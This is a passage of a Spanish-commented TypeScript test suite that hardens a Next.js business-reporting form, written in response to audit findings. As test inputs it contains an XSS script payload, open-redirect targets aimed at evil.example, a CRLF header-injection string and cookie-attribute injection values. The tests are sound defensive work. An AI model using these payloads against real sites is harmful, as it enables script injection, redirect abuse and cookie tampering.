      ReportarNegocioPage({
        params: Promise.resolve({ ficha: segmento }),
        searchParams: Promise.resolve({}),
      } as never),
    );

    expect(html).not.toContain(CANARIO);
    expect(html).not.toMatch(/\d+\s+reportes?/i);
    expect(html).not.toContain("sin atender");
  });

  // El comentario ya NO vuelve por la query string (hallazgo M2, corregido en
  // la iteración 2): vuelve por la cookie de borrador. La propiedad que
  // importa es la misma —lo que el vecino escribió se pinta como texto, nunca
  // como marcado— y aquí se comprueba sobre el mecanismo nuevo.
  it("el borrador del comentario vuelve al formulario escapado, nunca como marcado", async () => {
    const payload = '"></textarea><script>alert(1)</script>';
    peticion.cookies[NOMBRE_COOKIE_BORRADOR] = codificarBorrador(
      payload,
      LIMITE_COMENTARIO_REPORTE,
    );

    const html = await render(
      ReportarNegocioPage({
        params: Promise.resolve({ ficha: segmento }),
        searchParams: Promise.resolve({ error: "comentario" }),
      } as never),
    );
    expect(html).not.toContain("<script>alert(1)");
    expect(html).toContain("&lt;script&gt;");
    expect(html).not.toContain("</textarea><script>");
  });

  // Lo que llega en una cookie es tan hostil como lo que llega en un
  // formulario: el borrador lo manda el navegador y puede venir cambiado.
  it("una cookie de borrador manipulada deja el formulario vacio, no roto", async () => {
    for (const valor of [
      "no-es-base64!!",
      "",
      "a".repeat(9000),
      "<script>alert(1)</script>",
      "aa, bb; cc",
    ]) {
      peticion.cookies[NOMBRE_COOKIE_BORRADOR] = valor;
      const html = (
        await render(
          ReportarNegocioPage({
            params: Promise.resolve({ ficha: segmento }),
            searchParams: Promise.resolve({}),
          } as never),
        )
        // Sin el `<script>` de reposicion de formularios que React siempre
        // agrega al final: es andamiaje del framework, no contenido.
      ).replace(/<script>[\s\S]*?<\/script>/g, "");

      expect(html, valor).toMatch(/<textarea[^>]*><\/textarea>/);
      expect(html, valor).not.toContain("alert(1)");
    }
  });

  // Requisito de privacidad de la corrección M2: el texto del vecino no puede
  // salir en la URL de ningún camino de error.
  it.each([
    ["sin motivo", {}],
    ["motivo inventado", { motivo: "porque-si" }],
    ["comentario de 400 caracteres", { motivo: "cerrado", relleno: "z".repeat(400) }],
  ])("el comentario NUNCA viaja en la URL (%s)", async (_caso, campos) => {
    const secreto = "TEXTO-DEL-VECINO-QUE-NO-DEBE-SALIR";
    const { relleno = "", ...resto } = campos as { relleno?: string };
    const destino = await respuestaDe(
      envio({
        ...(resto as Record<string, string>),
        comentario: `${secreto} ${relleno}`,
      }),
    );

    expect(destino).not.toContain(secreto);
    expect(destino).not.toContain("comentario=");
    expect(destino).toMatch(/\?error=(motivo|comentario|cupo|servidor)$/);
    // Y sí vuelve, pero por la cookie: httpOnly, de la ruta del formulario.
    const puesta = peticion.puestas.at(-1);
    expect(puesta?.nombre).toBe(NOMBRE_COOKIE_BORRADOR);
    expect(puesta?.opciones.httpOnly).toBe(true);
    expect(puesta?.opciones.path).toBe(`/negocio/${segmento}/reportar`);
    expect(
      decodificarBorrador(puesta?.valor, LIMITE_COMENTARIO_REPORTE),
    ).toContain(secreto);
  });

  it("un envío que sí se guarda borra el borrador anterior", async () => {
    await respuestaDe(envio({ comentario: "borrador a medias" }));
    expect(peticion.puestas.at(-1)?.valor).not.toBe("");

    expect(await respuestaDe(envio({ motivo: "cerrado" }))).toBe(CONFIRMACION());
    const puesta = peticion.puestas.at(-1);
    expect(puesta?.nombre).toBe(NOMBRE_COOKIE_BORRADOR);
    expect(puesta?.valor).toBe("");
    expect(puesta?.opciones.maxAge).toBe(0);
  });

  it("un valor inventado en ?error no pinta ningún aviso", async () => {
    const html = await render(
      ReportarNegocioPage({
        params: Promise.resolve({ ficha: segmento }),
        searchParams: Promise.resolve({ error: "<b>inventado</b>" }),
      } as never),
    );
    expect(html).not.toContain("<b>inventado</b>");
    expect(html).not.toContain('role="alert"');
  });
});

// ── 8. Los argumentos "ligados" de la Server Action los manda el cliente ────
//
// HALLAZGO M3 (medio), CORREGIDO en la iteración 3 del dev. Next serializa
// los argumentos ligados con `.bind` como campos ocultos del formulario
// (`$ACTION_x:1`), en claro y sin firmar, TAMBIÉN en un build de producción:
// lo que llega por ahí es entrada del cliente, no un valor del servidor, y
// hay que tratar toda Server Action como alcanzable por un POST directo.
//
// Antes se ligaba también `hrefFicha`, y viajaba sin que nadie lo validara
// hasta el `Location` del `redirect` (redirect abierto) y hasta el atributo
// `Path` de la cookie de borrador (un `;` partía el atributo y colaba otro).
// Ahora el ÚNICO argumento ligado es `negocioId` —que la acción valida
// contra la base antes de usarlo para nada— y la ruta de la ficha la
// reconstruye el servidor con `construirSegmentoFicha`, que solo produce
// `[a-z0-9-]`.

describe("adversarial · la ruta de la ficha la fija el servidor, no el envío", () => {
  /** La única ruta que el servidor puede usar para este negocio. */
  const rutaReal = () => `/negocio/${segmento}/reportar`;

  /**
   * Campos que IMITAN el argumento ligado que existía antes, más los nombres
   * habituales de un redirect abierto y el propio campo oculto de Next.
   * Ninguno debe influir en el destino ni en la cookie.
   */
  const CAMPOS_DE_DESTINO = [
    "hrefFicha",
    "href",
    "next",
    "redirect",
    "returnTo",
    "callbackUrl",
    "$ACTION_1:1",
  ];

  async function conDestinoManipulado(
    destino: string,
    campos: Record<string, string> = { motivo: "cerrado" },
  ): Promise<string> {
    const formData = new FormData();
    for (const [clave, valor] of Object.entries(campos)) formData.append(clave, valor);
    for (const campo of CAMPOS_DE_DESTINO) formData.append(campo, destino);
    try {
      await reportarNegocio(idPublicado, formData);
    } catch (error) {
      if (error instanceof RedireccionSimulada) return error.url;
      if (error instanceof NoEncontradoSimulado) return "404";
      throw error;
    }
    throw new Error("se esperaba una redirección o un 404");
  }

  it.each([
    ["un sitio ajeno con esquema", "https://evil.example"],
    ["un sitio ajeno sin esquema", "//evil.example"],
    ["una ruta con salto de línea", "/x\r\nLocation: https://evil.example"],
    ["una ruta con atributos de cookie", "/x; Path=/"],
    ["texto vacío", ""],
  ])(
    "[M3] la redirección se queda en el sitio aunque el envío traiga %s",
    async (_caso, destino) => {
      const url = await conDestinoManipulado(destino);
      expect(url.startsWith("/negocio/")).toBe(true);
      expect(url).toBe(`${rutaReal()}/gracias`);
    },
  );

  // El destino no es solo "interno": es exactamente la ficha de ESE negocio,
  // reconstruida por el servidor con el nombre y el id que devolvió la base.
  it("[M3] el destino es la ruta de ESE negocio, reconstruida por el servidor", async () => {
    const url = await conDestinoManipulado("https://evil.example");
    expect(url).toBe(`/negocio/${segmento}/reportar/gracias`);
    expect(url).not.toContain("evil");
    expect(url).toMatch(/^\/negocio\/[a-z0-9-]+\/reportar\/gracias$/);
  });

  it("[M3] el Path de la cookie es siempre la ruta real del formulario", async () => {
    // Un `;` partía el atributo y dejaba colar otro `Path` más ancho, que
    // desactivaba justo el acotamiento que introdujo la corrección de M2.
    await conDestinoManipulado("/x; Path=/", { comentario: "sin motivo, para que falle" });

    const puesta = peticion.puestas.at(-1);
    expect(puesta?.nombre).toBe(NOMBRE_COOKIE_BORRADOR);
    expect(String(puesta?.opciones.path)).toMatch(/^\/negocio\/[a-z0-9-]+\/reportar$/);
    expect(puesta?.opciones.path).toBe(rutaReal());
    expect(String(puesta?.opciones.path)).not.toContain(";");
  });

  it("[M3] ningún campo del envío mete atributos en el Set-Cookie", async () => {
    for (const veneno of ["/x; Path=/", "/x; Domain=evil.example", "/x; SameSite=None"]) {
      await conDestinoManipulado(veneno, { comentario: "texto del vecino" });
      const puesta = peticion.puestas.at(-1);
      expect(puesta?.opciones.path, veneno).toBe(rutaReal());
      expect(puesta?.opciones.httpOnly, veneno).toBe(true);
      expect(JSON.stringify(puesta?.opciones), veneno).not.toContain("evil");
    }
  });

  // Y la reconstrucción no depende de que el nombre del negocio sea manso: lo
  // slugifica el mismo constructor que usa todo el directorio.
  it("[M3] un nombre de negocio con marcado no ensucia la ruta reconstruida", async () => {
    const hostil = await prisma.negocio.create({
      data: {
        nombre: 'Ficticio <script> ; Path=/ "evil" \\ 100%',
        categoriaId,
        coloniaId,
        whatsapp: `${PREFIJO}05`,
        consintioAvisoEn: new Date("2026-08-01T10:00:00.000Z"),
        estado: "publicado",
        publicadoEn: new Date("2026-08-10T10:00:00.000Z"),
      },
    });

    const formData = new FormData();
    formData.append("motivo", "cerrado");
    let url = "";
    try {
      await reportarNegocio(hostil.id, formData);
    } catch (error) {
      if (error instanceof RedireccionSimulada) url = error.url;
      else throw error;
    }

    expect(url).toBe(`/negocio/${construirSegmentoFicha(hostil.nombre, hostil.id)}/reportar/gracias`);
    expect(url).toMatch(/^\/negocio\/[a-z0-9-]+\/reportar\/gracias$/);
  });

  // Lo que SÍ estaba bien atado desde el principio: el negocio se valida
  // contra la base, así que un id cambiado a mano no permite reportar una
  // ficha que no está publicada.
  it("un negocioId cambiado a mano no escribe nada: sigue mandando al 404", async () => {
    const formData = new FormData();
    formData.append("motivo", "cerrado");
    let destino = "";
    try {
      await reportarNegocio(idEnRevision, formData);
    } catch (error) {
      if (error instanceof NoEncontradoSimulado) destino = "404";
      else if (error instanceof RedireccionSimulada) destino = error.url;
      else throw error;
    }
    expect(destino).toBe("404");
    expect(await prisma.reporte.count()).toBe(0);
  });

  // OBSERVACIÓN O11 (etapa C, iteración 3), CORREGIDA en la iteración 4. La
  // guarda `formData instanceof FormData` cubría el caso de MÁS argumentos
  // ligados de los que la acción declara, pero no el tipo de `negocioId`: un
  // bound como `[null]`, `[12345]` o `[{}]` la pasaba y reventaba más abajo,
  // en la consulta a la base — un 500 sin fuga y sin escritura, pero con
  // volcado de trazas de Prisma al log a voluntad de un anónimo.
  //
  // Ahora la acción comprueba `typeof negocioId !== "string"` y responde el
  // mismo 404 uniforme que cualquier otro envío inservible.
  it.each([
    ["null", null],
    ["un número", 12345],
    ["un objeto", { id: "x" }],
    ["un arreglo", ["x"]],
    ["undefined (bound vacío)", undefined],
    ["un booleano", true],
  ])(
    "[O11] un negocioId que no es texto responde 404, sin fila y sin cookie",
    async (_caso, valor) => {
      const formData = new FormData();
      formData.append("motivo", "cerrado");

      await expect(
        reportarNegocio(valor as unknown as string, formData),
      ).rejects.toBeInstanceOf(NoEncontradoSimulado);

      // Y lo que importaba desde el principio: ni fila, ni cookie.
      expect(await prisma.reporte.count()).toBe(0);
      expect(peticion.puestas).toHaveLength(0);
    },
  );

  // OBSERVACIÓN O12 (etapa C, iteración 3). `construirSegmentoFicha` slugifica
  // el NOMBRE pero interpola el `id` tal cual (`src/lib/ficha-url.ts`), así que
  // la garantía "la ruta solo puede ser `[a-z0-9-]`" se apoya en que todo id de
  // Negocio sea un cuid. Hoy lo es —nada en `src/` fija ids a mano, los pone
  // `@default(cuid())`— y por eso esto es una observación y no un hallazgo:
  // no hay camino de cliente que lo alcance. Esta prueba deja la dependencia
  // ESCRITA, para que se caiga en rojo el día que alguien permita elegir un id.
  it("[O12] la ruta reconstruida solo es limpia porque el id es un cuid", async () => {
    // El nombre se sanea: da igual lo que traiga.
    expect(construirSegmentoFicha('<script>; Path=/', "abc123")).toBe("script-path-abc123");
    // El id NO se sanea: entra tal cual al segmento.
    expect(construirSegmentoFicha("Negocio", "evil/../x; Path=/")).toContain("/../");

    // Por eso el invariante real es este, y aquí queda fijado sobre la base:
    // todo id de Negocio es alfanumérico, así que el segmento no puede escapar.
    const ids = await prisma.negocio.findMany({ select: { id: true } });
    expect(ids.length).toBeGreaterThan(0);
    for (const { id } of ids) expect(id).toMatch(/^[a-z0-9]+$/);
  });

  // La cota del borrador la pone el servidor, no el cliente: un comentario
  // enorme no puede inflar el encabezado `Set-Cookie` de la respuesta.
  it("un comentario gigantesco no infla la cookie de borrador", async () => {
    const formData = new FormData();
    formData.append("comentario", "z".repeat(500_000));
    try {
      await reportarNegocio(idPublicado, formData);
    } catch (error) {
      if (!(error instanceof RedireccionSimulada)) throw error;
    }
    const puesta = peticion.puestas.at(-1);
    // base64 de 300 caracteres ASCII = 400; se deja margen para multibyte.
    expect(String(puesta?.valor).length).toBeLessThan(1_700);
  });
});
